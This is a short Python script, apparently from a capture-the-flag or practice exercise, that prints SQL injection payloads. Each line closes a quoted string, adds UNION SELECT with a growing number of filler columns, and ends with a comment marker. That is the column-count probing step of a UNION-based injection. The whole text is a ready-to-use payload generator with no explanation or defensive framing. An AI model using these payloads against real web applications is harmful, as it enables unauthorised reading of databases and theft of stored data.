s = "gura' UNION SELECT "
s+="'gura'"
for i in range(30):
    s+=",'gura'"
    print(s+" -- '")
